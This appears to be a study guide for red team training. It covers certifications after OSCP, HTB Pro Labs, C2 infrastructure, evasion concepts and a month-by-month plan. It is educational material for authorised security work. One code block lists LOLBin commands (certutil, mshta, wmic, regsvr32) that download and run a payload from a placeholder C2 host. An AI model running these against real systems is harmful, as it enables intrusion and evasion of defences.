# Red Team Lab Orientation

Red teaming is not pentesting with a fancier name. It requires operational security, evasion, C2 infrastructure, and adversary simulation. Sequence this after OSCP.

## Certification Path After OSCP

```
OSCP → CRTO → OSEP → (Maldev Academy) → CRTE/CRTO II
```

**CRTO** (Certified Red Team Operator) by ZeroPoint Security — zeropointsecurity.co.uk
- Cobalt Strike-focused lab environment
- Covers: phishing, C2 setup, lateral movement, kerberos attacks, evasion basics
- Best first Red Team cert — practical, well-structured, affordable (~£365)

**OSEP** (PEN-300) by OffSec
- Advanced evasion techniques, antivirus bypass, AppLocker bypass
- Custom payload development in C#
- Requires strong C# or .NET knowledge going in

**Maldev Academy** — maldevacademy.com
- Malware development: shellcode injection, process hollowing, AMSI bypass, ETW patching
- Goes deep into Windows internals
- Multi-month course, not a certification

## Red Team Lab Environments

**HTB Pro Labs "RastaLabs"**: Full red team engagement simulation. Persistent environment, requires stealth. No guiding hints.

**HTB Pro Labs "Cybernetics"**: Modern Windows environment with Defender, EDR concepts, advanced evasion required.

## Core Red Team Concepts to Build

**C2 Infrastructure**:
- Redirectors (Apache mod_rewrite, Nginx) to hide C2 server
- Domain fronting via CDNs
- HTTPS C2 traffic to blend with legitimate traffic
- Tools: Cobalt Strike (paid), Havoc C2 (free/open source), Sliver (free)

**Payload Evasion**:
```
AMSI bypass → ETW patching → Defender signature evasion → Behavioral evasion
```

**Living off the Land (LOLbins)**:
```bash
# Common LOLBIN execution
certutil -urlcache -f http://C2/payload.exe payload.exe
mshta http://C2/payload.hta
wmic process call create "cmd.exe /c payload"
regsvr32 /s /n /u /i:http://C2/payload.sct scrobj.dll
```

**OPSEC Discipline**:
- Never reuse infrastructure across engagements
- Use per-engagement domains (aged domains with good reputation)
- Assume endpoint logging: avoid obvious tool signatures
- Clean up after lateral movement (remove tools, clear event logs with authorization)

## Realistic Sequence

Month 1–3 post-OSCP: practice HTB Pro Labs Offshore, deepen AD attacks
Month 4–6: CRTO course + lab
Month 7–9: OSEP or Maldev Academy depending on focus (ops vs. dev)
Month 10+: RastaLabs, Cybernetics, real engagements
